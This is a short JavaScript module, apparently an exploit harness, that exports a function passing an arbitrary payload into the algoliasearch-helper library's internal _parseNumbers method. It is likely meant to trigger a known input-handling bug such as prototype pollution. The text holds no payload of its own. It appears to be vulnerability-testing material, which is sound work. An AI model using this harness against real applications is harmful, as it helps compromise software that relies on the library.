function exploitFunction(payload) {
  const algohelp = require("algoliasearch-helper");
  algohelp.SearchParameters._parseNumbers(payload);
}

module.exports = { exploitFunction };